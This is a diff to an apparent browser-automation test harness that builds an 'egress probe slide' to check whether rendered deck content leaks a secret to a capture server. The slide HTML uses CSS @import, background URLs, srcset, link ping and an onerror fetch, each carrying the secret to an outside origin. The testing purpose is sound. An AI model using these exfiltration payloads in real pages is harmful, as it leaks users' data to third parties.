@@ -80,8 +80,7 @@ async function serveS3(o, content, blocks) {
 
 // let every request the page is going to make get made (images, frames, beacons, reports)
 const quiesce = async (page) => {
-  await page.waitForLoadState('networkidle')
-  await page.waitForTimeout(800)
+  await page.waitForTimeout(1200) // not networkidle: the studios keep a request in flight
 }
 
 // ---------------------------------------------------------------------------------------------------------------
@@ -169,7 +168,8 @@ const rawSlide = () =>
   `<style>@import url(${cap.origin}/deck-import?d=${SECRET}); .bg{background:url(${cap.origin}/deck-css?d=${SECRET})}</style>` +
   `<h1 style="font-size:60px;margin:0">Egress probe slide</h1>` +
   `<img alt="" width="8" height="8" src="${withSecret('/deck-img')}">` +
-  `<div class="bg" style="width:40px;height:40px;background-image:url(${withSecret('/deck-style')})"></div>` +
+  `<div style="width:40px;height:40px;background-image:url(${withSecret('/deck-style')})"></div>` +
+  `<div class="bg" style="width:40px;height:40px"></div>` +
   `<img alt="" width="8" height="8" srcset="${withSecret('/deck-srcset')} 2x">` +
   `<a id="pinger" href="#" ping="${withSecret('/deck-ping')}" style="color:#fff">link</a>` +
   `<img alt="" width="8" height="8" src="/__missing.png" onerror="fetch('${withSecret('/deck-fetch')}')">` +
